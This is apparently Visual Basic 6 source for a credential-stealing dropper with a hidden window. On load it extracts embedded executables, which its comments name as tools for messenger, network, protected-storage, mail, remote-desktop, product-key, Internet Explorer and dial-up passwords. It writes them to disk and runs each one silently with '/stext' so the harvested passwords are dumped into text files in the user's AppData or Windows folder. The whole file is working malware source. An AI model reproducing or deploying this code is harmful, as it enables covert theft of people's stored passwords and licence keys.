VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Form1"
   ClientHeight    =   2025
   ClientLeft      =   -15
   ClientTop       =   375
   ClientWidth     =   5745
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2025
   ScaleWidth      =   5745
   StartUpPosition =   3  'Windows Default
   Begin VB.ListBox l1 
      Height          =   1815
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   5535
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function GetVersionEx Lib "kernel32" Alias "GetVersionExA" (lpVersionInformation As OSVERSIONINFO) As Long

Private Type OSVERSIONINFO
    OSVersionInfoSize As Long
    MajorVersion As Long
    MinorVersion As Long
    BuildNumber As Long
    PlatformId As Long
    szCSDVersion As String * 128
End Type

Private Type OSVERSIONINFOEX
    dwOSVersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
    wServicePackMajor As Integer
    wServicePackMinor As Integer
    wSuiteMask As Integer
    wProductType As Byte
    wReserved As Byte
End Type

Public Function o1() As String
Dim OS As OSVERSIONINFO
Dim durum As Boolean
Dim version As String
OS.OSVersionInfoSize = Len(OS)
durum = GetVersionEx(OS)
version = OS.PlatformId & "." & OS.MajorVersion & "." & OS.MinorVersion
    Select Case version
        Case "1.4.0"
            o1 = "0"
        Case "1.4.10"
            o1 = "0"
        Case "1.4.98"
            o1 = "0"
        Case "2.3.51"
            o1 = "0"
        Case "2.4.0"
            o1 = "0"
        Case "2.5.0"
            o1 = "0"
        Case "2.5.1"
            o1 = "0"
        Case "2.6.0"
            o1 = "1"
        Case Else
            o1 = "0"
End Select
End Function


Private Sub Form_Load()
'101 : instant messenger passwords
'102 : network pass
'103 : protected staroage pass
'104 : mail passwords
'105 : remoote desktop
'106 : produkey
'107 : ie passwords
'108 : dial passwprds

Dim resbytes() As Byte
For sayac = 102 To 108
resbytes = LoadResData(sayac, "CUSTOM")
Open App.Path & "\" & sayac & ".exe" For Binary As #1
Put #1, , resbytes
Close #1
Next

Select Case o1
    Case "1"
        yol = Environ("systemdrive") & "\Users\" & Environ("username") & "\AppData\Roaming\"
    Case Else
        yol = Environ("systemroot") & "\"
End Select

For sayac = 102 To 108
l1.AddItem "/stext " & yol & sayac & ".txt"
Next

On Local Error Resume Next
For sayac = 102 To 108
 ShellExecute &O0, vbNullString, App.Path & "\" & sayac & ".exe", l1.List(sayac - 102), vbNullString, vbHide
Next
End
End Sub
